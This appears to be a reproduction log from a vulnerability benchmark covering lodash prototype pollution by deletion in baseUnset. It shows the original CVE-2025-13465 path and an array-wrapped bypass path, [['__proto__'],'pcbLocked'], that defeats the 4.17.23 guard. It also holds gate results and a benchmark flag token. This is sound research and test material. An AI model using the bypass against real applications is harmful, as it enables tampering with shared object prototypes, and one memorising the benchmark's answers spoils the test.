# repro.log — lodash-cve-2026-2950
# Pair: CVE-2025-13465 (original) -> CVE-2026-2950 (incomplete-fix target)
# Root cause: prototype pollution (CWE-1321) in lodash baseUnset (reached via _.unset/_.omit). Variant A (same-sink) gate.
# Unusual class: pollution BY DELETION — baseUnset `delete`s the last path key; a crafted segment makes the delete
#   land on a built-in prototype (Object.prototype) and REMOVE a property from it.
# Faithful-core: node:20-slim, REAL published lodash baseUnset per version via npm aliases; harness drives REAL _.unset
#   V0=lodash@4.17.21 (no guard)  V1=lodash@4.17.23 (TARGET, string-only guard)  V2=lodash@4.18.1 (negative control)
# Run: PCB_FLAG=<token> docker compose --profile v0 --profile v1 --profile v2 up -d --build
#      PCB_FLAG=<token> python3 oracle.py --wait

PCB_FLAG (this run) = PCBFLAG_9f3dbeefbb47184a33e20960e19e7a56

== GATE (flag_oracle.validate_case, Variant A) ==
original_poc_reaches_flag_on_v0 : true
original_poc_blocked_on_v1      : true
bypass_poc_reaches_flag_on_v1   : true
passed                          : true
_residual_blocked_on_v2 (bonus) : true

== Raw probe evidence (GET /probe?path=<json-encoded lodash-unset path>) ==

--- SEED (CVE-2025-13465): path="__proto__.pcbLocked" (string) ---
seed@v0 (lodash 4.17.21, no guard):        polluted=true,  gated_secret=PCBFLAG_9f3dbeefbb47184a33e20960e19e7a56   => REACHES FLAG
    (no guard -> baseUnset walks `__proto__` to Object.prototype and deletes `pcbLocked` -> lock removed)
seed@v1 (lodash 4.17.23, string guard):    polluted=false, gated_secret=denied  => BLOCKED
    (guard blocks the STRING key '__proto__' when not an own prop -> baseUnset returns false, no delete)

--- RESIDUAL (CVE-2026-2950): path=[["__proto__"],"pcbLocked"] (array-WRAPPED first segment) ---
residual@v1 (lodash 4.17.23): polluted=true,  gated_secret=PCBFLAG_9f3dbeefbb47184a33e20960e19e7a56   => REACHES FLAG (bypass)
    (guard `if (typeof key !== 'string') continue;` skips the array segment ['__proto__'] (typeof 'object');
     but `toKey(['__proto__'])`='__proto__' at the sink -> delete lands on Object.prototype -> lock removed)
residual@v2 (lodash 4.18.1): polluted=false, gated_secret=denied  => BLOCKED (negative control)
    (guard `var key = toKey(path[index]);` coerces every segment FIRST -> ['__proto__'] normalized to
     '__proto__' and rejected at any non-terminal position)

--- BENIGN control (own-property unset, must NOT trip the gate) ---
benign@v1 (lodash 4.17.23, path=["a","b"]): polluted=false, gated_secret=denied  => DENIED
    (deletes target.a.b, a normal OWN slot; never touches Object.prototype -> lock survives)

== Sink / guard / residual (pinned from published source; see patch.diff) ==
sink   : lodash.js baseUnset (reached via _.unset/_.omit) — `parent(object,path); delete object[toKey(last(path))]`.
         A crafted segment (__proto__, or constructor->prototype) makes the delete land on a built-in prototype.
V0 4.17.21: (none)
V1 4.17.23: guard loop; `if (typeof key !== 'string') continue;` then block string `__proto__` /
            `constructor`->`prototype`.  <- the CVE-2025-13465 fix (commit edadd45); STRING segments only. TARGET
V2 4.18.1 : `var key = toKey(path[index]);` (coerce every segment) then block __proto__/constructor/prototype
            at any non-terminal position.  <- the CVE-2026-2950 fix
residual: V1 validates only STRING path segments. Wrapping the segment in an array
          ([['__proto__'],'pcbLocked']) makes typeof 'object' -> guard's `continue` skips it, yet
          toKey() coerces it back to '__proto__' at the delete sink. (per GHSA-f23m-r3pf-42rh / CVE-2026-2950)

== Data quality ==
- Same sink (baseUnset) across both CVEs. V1 GENUINELY has the guard (verified in published 4.17.23 source), just incomplete.
- Distinct commits & releases: 4.17.23 (2026-01-21, commit edadd45) -> 4.18.1 (2026-04-01; 4.18.0 of 2026-03-31 deprecated).
  No intervening non-CVE release touched baseUnset. Not same-release / not same-commit.
- V0 = 4.17.21 (last vulnerable version published on npm; 4.17.22 was never published but is within the affected range).

== Benign canary ==
No real payload / no offensive PoC (mechanism derived from advisory + published source diff only). A benign lock
`Object.prototype.pcbLocked=true` (non-enumerable, configurable) is planted before each probe (default DENY). The gate
releases the planted per-run ${PCB_FLAG} only if `_.unset` DELETED that inherited lock off the prototype = prototype
pollution by deletion. Pollution is GLOBAL (real shared Object.prototype), so the harness restores the lock after every
probe to keep probes independent. Benign own-property unset never trips it. Verified end-to-end on real Docker.

